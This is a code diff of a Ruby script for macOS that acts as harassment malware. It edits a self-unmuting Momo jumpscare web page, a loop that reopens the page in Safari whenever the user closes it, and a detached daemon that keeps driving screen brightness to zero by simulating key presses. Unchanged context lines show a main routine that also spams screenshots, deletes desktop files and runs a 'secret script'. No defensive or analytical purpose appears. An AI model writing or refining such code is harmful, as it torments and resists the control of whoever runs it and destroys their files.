@@ -55,7 +55,7 @@ def create_jumpscare_html(video_url)
       var video = document.getElementById('video');
       video.play();
       video.addEventListener('loadeddata', function() {
-        // After 500ms, unmute and play.
+        // After 500ms, unmute and resume playback.
         setTimeout(function(){
           video.muted = false;
           video.play();
@@ -88,7 +88,7 @@ def persistent_jumpscare(video_url)
     system("osascript -e 'tell application \"Safari\" to set visible of front window to true'")
     # Let the jumpscare play for 1 second.
     sleep 1
-
+    
     # Check if any Safari tab's URL contains "jumpscare".
     check_script = %Q{
       tell application "Safari"
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If not found (i.e. if the page was closed), reopen it.
+    # If the jumpscare page is not open, reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -110,32 +110,17 @@ def persistent_jumpscare(video_url)
   end
 end
 
-# --- Maintain Darkness: Set brightness to 0 without Homebrew (Detached Process) ---
-def set_brightness_to_zero
-  # AppleScript to open Displays pane, set brightness slider to 0, then close System Preferences.
-  script = <<-APPLESCRIPT
-tell application "System Preferences"
-    reveal anchor "displaysDisplayTab" of pane id "com.apple.preference.displays"
-    delay 0.5
-end tell
-tell application "System Events"
-    tell process "System Preferences"
-        try
-            set brightnessSlider to slider 1 of window 1
-            set value of brightnessSlider to 0
-        end try
-    end tell
-end tell
-tell application "System Preferences" to quit
-  APPLESCRIPT
-  system("osascript -e '#{script}'")
-end
-
+# --- New Maintain Darkness Function ---
+# Instead of using brightness utility, simulate pressing the brightness-down key.
 def maintain_darkness
   pid = fork do
     Process.daemon(true, true)
     loop do
-      set_brightness_to_zero
+      # Simulate pressing the brightness-down key 10 times.
+      10.times do
+        system("osascript -e 'tell application \"System Events\" to key code 144'")
+        sleep 0.05
+      end
       sleep 3
     end
   end
@@ -173,8 +158,8 @@ def run_secret_script
 end
 
 # --- Jo Action ---
-# Executes spam screenshots, delete desktop files, maintain darkness, run secret script,
-# and launch persistent Momo jumpscare.
+# Executes: spam screenshots, delete desktop files, maintain darkness,
+# run secret script, and launch persistent Momo jumpscare.
 def jo_action
   spam_screenshots
   delete_desktop_files
